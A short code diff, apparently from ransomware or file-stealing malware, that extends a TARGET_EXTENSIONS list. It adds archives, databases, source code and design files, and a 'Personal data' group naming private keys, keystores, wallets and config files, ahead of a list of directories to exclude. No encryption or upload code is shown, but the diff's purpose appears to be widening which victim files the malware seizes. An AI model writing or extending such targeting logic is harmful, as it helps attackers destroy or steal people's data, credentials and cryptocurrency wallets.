@@ -19,17 +19,40 @@ const TARGET_EXTENSIONS = [
     '.png',
     '.gif',
     '.bmp',
+    '.tiff',
+    '.raw',
     // Archives
     '.zip',
     '.rar',
     '.7z',
+    '.tar',
+    '.gz',
     // Database
     '.sql',
     '.db',
     '.sqlite',
-    // Other
+    '.accdb',
+    '.mdb',
+    // Source code
+    '.js',
+    '.ts',
+    '.py',
+    '.java',
+    '.cs',
+    '.php',
+    // Other valuable files
     '.json',
-    '.xml'
+    '.xml',
+    '.html',
+    '.css',
+    '.psd',
+    '.ai',
+    // Personal data
+    '.key',
+    '.keystore',
+    '.wallet',
+    '.dat',
+    '.config'
 ]
 
 // Directories to exclude
